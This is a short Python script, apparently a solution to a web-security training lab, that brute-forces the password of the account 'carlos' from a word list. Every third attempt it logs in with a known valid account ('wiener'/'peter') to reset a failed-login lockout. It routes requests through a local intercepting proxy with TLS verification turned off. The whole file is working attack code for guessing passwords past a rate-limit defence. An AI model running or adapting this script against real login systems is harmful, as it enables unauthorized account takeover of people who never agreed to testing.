import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login_logout(s,url):
    data = {"username":"wiener","password":"peter"}
    response = s.post(f"{url}/login", data=data, verify = False, proxies = proxies)
    if "Log out" in response.text or "Update email" in response.text:
        print ("Loged in as wiener")
        print ("Logging out...")
        response = s.get(f"{url}/logout", verify = False, proxies = proxies)
        if "Log out" not in response.text:
            print ("Logged out")
        else:
            print ("Failed to log out")
    else:
        print ("failed to login with wiener")


def brut_forcer(s,url): 
    counter = 0
    with open("pass.txt", "r") as passwords:
        for line in passwords:
            counter += 1

            if counter %3 == 0:
                login_logout(s,url)
                print ("Did login&logout")
                counter += 1
                #now resume the bruteforce
                password = line.strip()
                data = {"username":"carlos","password":password}
                response = s.post(f"{url}/login", data=data, verify = False, proxies = proxies)
                if "Log out" in response.text or "Update email" in response.text:
                    print (f"\nsuccess! the passwword is:{password}")
                    break
                else:
                    print(f"tried code: {password}")
                
            else:
                password = line.strip()
                data = {"username":"carlos","password":password}
                response = s.post(f"{url}/login", data=data, verify = False, proxies = proxies)
                if "Log out" in response.text or "Update email" in response.text:
                    print (f"\nsuccess! the passwword is:{password}")
                    break
                else:
                    print(f"tried code: {password}")
                

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    print("(+)  Starting Brute Froce...")
    brut_forcer(s,url)
    




if __name__ == "__main__":
    main()